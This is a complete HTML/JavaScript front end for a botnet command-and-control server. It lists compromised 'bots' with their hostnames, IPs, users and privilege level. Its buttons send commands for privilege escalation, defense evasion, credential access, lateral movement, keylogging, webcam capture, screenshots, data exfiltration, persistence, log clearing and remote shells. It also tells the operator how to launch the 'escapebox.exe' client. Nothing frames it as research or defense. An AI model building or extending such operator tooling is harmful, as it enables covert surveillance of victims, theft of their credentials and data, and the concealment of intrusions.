<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Command & Control Dashboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Consolas', 'Monaco', monospace;
            background: #0d1117;
            color: #c9d1d9;
            line-height: 1.4;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
            border-bottom: 2px solid #21262d;
            padding-bottom: 20px;
        }
        
        .header h1 {
            color: #f85149;
            font-size: 2.5em;
            font-weight: bold;
            margin-bottom: 10px;
        }
        
        .status-bar {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
        }
        
        .status-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 10px;
        }
        
        .status-item {
            text-align: center;
        }
        
        .status-value {
            font-size: 2em;
            font-weight: bold;
            color: #58a6ff;
        }
        
        .status-label {
            color: #8b949e;
            font-size: 0.9em;
        }
        
        .tabs {
            display: flex;
            background: #161b22;
            border-radius: 8px 8px 0 0;
            overflow: hidden;
            margin-bottom: 0;
        }
        
        .tab {
            padding: 15px 25px;
            background: #21262d;
            color: #8b949e;
            cursor: pointer;
            border: none;
            font-family: inherit;
            font-size: 1em;
            transition: all 0.2s ease;
            position: relative;
        }
        
        .tab:hover {
            background: #30363d;
            color: #c9d1d9;
        }
        
        .tab.active {
            background: #58a6ff;
            color: #ffffff;
            font-weight: bold;
        }
        
        .tab.active::after {
            content: '';
            position: absolute;
            bottom: -2px;
            left: 0;
            width: 100%;
            height: 3px;
            background: #58a6ff;
        }
        
        .content {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 0 0 8px 8px;
            min-height: 400px;
        }
        
        .tab-content {
            display: none;
            padding: 20px;
        }
        
        .tab-content.active {
            display: block;
        }
        
        .clients-grid {
            display: grid;
            gap: 15px;
        }
        
        .client-card {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 15px;
        }
        
        .client-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .client-name {
            font-weight: bold;
            color: #58a6ff;
        }
        
        .client-status {
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 0.8em;
            font-weight: bold;
        }
        
        .status-online {
            background: #238636;
            color: white;
        }
        
        .status-offline {
            background: #da3633;
            color: white;
        }
        
        .client-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .info-item {
            font-size: 0.9em;
        }
        
        .info-label {
            color: #8b949e;
        }
        
        .client-actions {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        .btn {
            padding: 8px 16px;
            border: 1px solid #30363d;
            border-radius: 4px;
            background: #21262d;
            color: #c9d1d9;
            cursor: pointer;
            font-family: inherit;
            font-size: 0.9em;
            transition: all 0.2s ease;
        }
        
        .btn:hover {
            background: #30363d;
            border-color: #58a6ff;
        }
        
        .btn-primary {
            background: #238636;
            border-color: #238636;
        }
        
        .btn-primary:hover {
            background: #2ea043;
        }
        
        .btn-danger {
            background: #da3633;
            border-color: #da3633;
        }
        
        .btn-danger:hover {
            background: #f85149;
        }
        
        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: #8b949e;
        }
        
        .empty-state h3 {
            margin-bottom: 10px;
            color: #c9d1d9;
        }
        
        .loading {
            text-align: center;
            padding: 40px;
            color: #8b949e;
        }
        
        .activity-log {
            max-height: 400px;
            overflow-y: auto;
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 15px;
        }
        
        .activity-item {
            margin-bottom: 10px;
            padding: 8px;
            border-left: 3px solid #21262d;
            padding-left: 15px;
        }
        
        .activity-time {
            color: #8b949e;
            font-size: 0.8em;
        }
        
        .activity-message {
            margin-top: 5px;
        }
        
        .controls-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
        }
        
        .control-section {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 20px;
        }
        
        .control-section h3 {
            margin-bottom: 15px;
            color: #58a6ff;
        }
        
        .control-buttons {
            display: grid;
            gap: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>C2 COMMAND & CONTROL</h1>
            <div class="status-bar">
                <div class="status-grid">
                    <div class="status-item">
                        <div class="status-value" id="total-bots">0</div>
                        <div class="status-label">Total Bots</div>
                    </div>
                    <div class="status-item">
                        <div class="status-value" id="active-bots">0</div>
                        <div class="status-label">Active Bots</div>
                    </div>
                    <div class="status-item">
                        <div class="status-value" id="total-commands">0</div>
                        <div class="status-label">Commands Sent</div>
                    </div>
                    <div class="status-item">
                        <div class="status-value" id="server-uptime">0m</div>
                        <div class="status-label">Server Uptime</div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="tabs">
            <button class="tab active" onclick="showTab('clients')">All Clients</button>
            <button class="tab" onclick="showTab('activity')">Activity Log</button>
            <button class="tab" onclick="showTab('controls')">Controls</button>
        </div>
        
        <div class="content">
            <div id="clients-tab" class="tab-content active">
                <div id="clients-container">
                    <div class="loading">Loading client data...</div>
                </div>
            </div>
            
            <div id="activity-tab" class="tab-content">
                <div class="activity-log" id="activity-log">
                    <div class="loading">Loading activity data...</div>
                </div>
            </div>
            
            <div id="controls-tab" class="tab-content">
                <div class="controls-grid">
                    <div class="control-section">
                        <h3>Attack Phases</h3>
                        <div class="control-buttons">
                            <button class="btn btn-primary" onclick="executeCommand('PHASE_1')">1. Reconnaissance</button>
                            <button class="btn btn-primary" onclick="executeCommand('PHASE_2')">2. Privilege Escalation</button>
                            <button class="btn btn-primary" onclick="executeCommand('PHASE_3')">3. Defense Evasion</button>
                            <button class="btn btn-primary" onclick="executeCommand('PHASE_4')">4. Credential Access</button>
                            <button class="btn btn-primary" onclick="executeCommand('PHASE_5')">5. Lateral Movement</button>
                        </div>
                    </div>
                    
                    <div class="control-section">
                        <h3>Collection</h3>
                        <div class="control-buttons">
                            <button class="btn" onclick="executeCommand('SCREENSHOT_ALL')">Screenshots</button>
                            <button class="btn" onclick="executeCommand('KEYLOG_START')">Start Keylogger</button>
                            <button class="btn" onclick="executeCommand('KEYLOG_DUMP')">Dump Keylogs</button>
                            <button class="btn" onclick="executeCommand('WEBCAM_CAPTURE')">Webcam Capture</button>
                        </div>
                    </div>
                    
                    <div class="control-section">
                        <h3>Impact</h3>
                        <div class="control-buttons">
                            <button class="btn btn-danger" onclick="executeCommand('EXFILTRATE')">Data Exfiltration</button>
                            <button class="btn btn-danger" onclick="executeCommand('PERSISTENCE')">Install Persistence</button>
                            <button class="btn btn-danger" onclick="executeCommand('CLEAR_LOGS')">Clear All Logs</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let currentTab = 'clients';
        let refreshInterval;
        
        // Tab switching with visual indication
        function showTab(tabName) {
            // Remove active class from all tabs and content
            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
            
            // Add active class to selected tab and content
            event.target.classList.add('active');
            document.getElementById(tabName + '-tab').classList.add('active');
            
            currentTab = tabName;
            
            // Load data for the selected tab
            if (tabName === 'clients') {
                loadClients();
            } else if (tabName === 'activity') {
                loadActivity();
            }
        }
        
        // Load real server status
        async function loadStatus() {
            try {
                const response = await fetch('/api/status');
                const data = await response.json();
                
                document.getElementById('total-bots').textContent = data.total_bots || 0;
                document.getElementById('active-bots').textContent = data.active_bots || 0;
                document.getElementById('total-commands').textContent = data.total_commands || 0;
                document.getElementById('server-uptime').textContent = data.uptime || '0m';
            } catch (error) {
                console.error('Failed to load status:', error);
                // Show real error state
                document.getElementById('total-bots').textContent = '?';
                document.getElementById('active-bots').textContent = '?';
                document.getElementById('total-commands').textContent = '?';
                document.getElementById('server-uptime').textContent = '?';
            }
        }
        
        // Load real client data
        async function loadClients() {
            const container = document.getElementById('clients-container');
            
            try {
                const response = await fetch('/api/clients');
                const data = await response.json();
                
                if (!data.clients || data.clients.length === 0) {
                    // Show real empty state - no false data
                    container.innerHTML = `
                        <div class="empty-state">
                            <h3>No Connected Clients</h3>
                            <p>Waiting for bots to connect to the C2 server...</p>
                            <p style="margin-top: 15px; font-size: 0.9em;">
                                Start a client with: <code>escapebox.exe client [server_ip]</code>
                            </p>
                        </div>
                    `;
                    return;
                }
                
                // Display real clients
                let html = '<div class="clients-grid">';
                data.clients.forEach(client => {
                    const lastSeen = new Date(client.last_seen * 1000).toLocaleString();
                    const isOnline = (Date.now() / 1000 - client.last_seen) < 60;
                    
                    html += `
                        <div class="client-card">
                            <div class="client-header">
                                <div class="client-name">${client.hostname || client.id}</div>
                                <div class="client-status ${isOnline ? 'status-online' : 'status-offline'}">
                                    ${isOnline ? 'ONLINE' : 'OFFLINE'}
                                </div>
                            </div>
                            <div class="client-info">
                                <div class="info-item">
                                    <span class="info-label">IP:</span> ${client.ip || 'Unknown'}
                                </div>
                                <div class="info-item">
                                    <span class="info-label">User:</span> ${client.username || 'Unknown'}
                                </div>
                                <div class="info-item">
                                    <span class="info-label">OS:</span> ${client.os || 'Unknown'}
                                </div>
                                <div class="info-item">
                                    <span class="info-label">Elevated:</span> ${client.elevated ? 'Yes' : 'No'}
                                </div>
                                <div class="info-item">
                                    <span class="info-label">Last Seen:</span> ${lastSeen}
                                </div>
                                <div class="info-item">
                                    <span class="info-label">Commands:</span> ${client.commands_executed || 0}
                                </div>
                            </div>
                            <div class="client-actions">
                                <button class="btn" onclick="sendClientCommand('${client.id}', 'SYSINFO')">System Info</button>
                                <button class="btn" onclick="sendClientCommand('${client.id}', 'SCREENSHOT')">Screenshot</button>
                                <button class="btn" onclick="sendClientCommand('${client.id}', 'KEYLOG:START')">Keylogger</button>
                                <button class="btn btn-danger" onclick="sendClientCommand('${client.id}', 'SHELL')">Shell</button>
                            </div>
                        </div>
                    `;
                });
                html += '</div>';
                container.innerHTML = html;
                
            } catch (error) {
                console.error('Failed to load clients:', error);
                container.innerHTML = `
                    <div class="empty-state">
                        <h3>Connection Error</h3>
                        <p>Failed to connect to C2 server</p>
                        <p style="margin-top: 10px; color: #f85149;">Error: ${error.message}</p>
                    </div>
                `;
            }
        }
        
        // Load real activity log
        async function loadActivity() {
            const container = document.getElementById('activity-log');
            
            try {
                const response = await fetch('/api/activity');
                const data = await response.json();
                
                if (!data.activities || data.activities.length === 0) {
                    container.innerHTML = `
                        <div class="empty-state">
                            <h3>No Activity</h3>
                            <p>No recent activity to display</p>
                        </div>
                    `;
                    return;
                }
                
                let html = '';
                data.activities.forEach(activity => {
                    html += `
                        <div class="activity-item">
                            <div class="activity-time">${activity.timestamp}</div>
                            <div class="activity-message">
                                <strong>[${activity.category}]</strong> ${activity.action}: ${activity.message}
                            </div>
                        </div>
                    `;
                });
                container.innerHTML = html;
                
            } catch (error) {
                console.error('Failed to load activity:', error);
                container.innerHTML = `
                    <div class="empty-state">
                        <h3>Error Loading Activity</h3>
                        <p>Failed to load activity log</p>
                    </div>
                `;
            }
        }
        
        // Send command to specific client
        async function sendClientCommand(clientId, command) {
            try {
                const response = await fetch('/api/command', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        client_id: clientId,
                        command: command
                    })
                });
                
                const result = await response.json();
                
                if (result.status === 'success') {
                    alert(`Command "${command}" sent to ${clientId}`);
                } else {
                    alert(`Failed to send command: ${result.message}`);
                }
                
                // Refresh data
                loadStatus();
                if (currentTab === 'clients') {
                    loadClients();
                }
                
            } catch (error) {
                alert(`Error sending command: ${error.message}`);
            }
        }
        
        // Execute global command
        async function executeCommand(command) {
            try {
                const response = await fetch('/api/command', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        command: command
                    })
                });
                
                const result = await response.json();
                
                if (result.status === 'success') {
                    alert(`Global command "${command}" executed`);
                } else {
                    alert(`Failed to execute command: ${result.message}`);
                }
                
                // Refresh data
                loadStatus();
                
            } catch (error) {
                alert(`Error executing command: ${error.message}`);
            }
        }
        
        // Initialize dashboard
        function init() {
            loadStatus();
            loadClients();
            
            // Set up auto-refresh every 5 seconds
            refreshInterval = setInterval(() => {
                loadStatus();
                if (currentTab === 'clients') {
                    loadClients();
                } else if (currentTab === 'activity') {
                    loadActivity();
                }
            }, 5000);
        }
        
        // Start the dashboard
        init();
    </script>
</body>
</html>
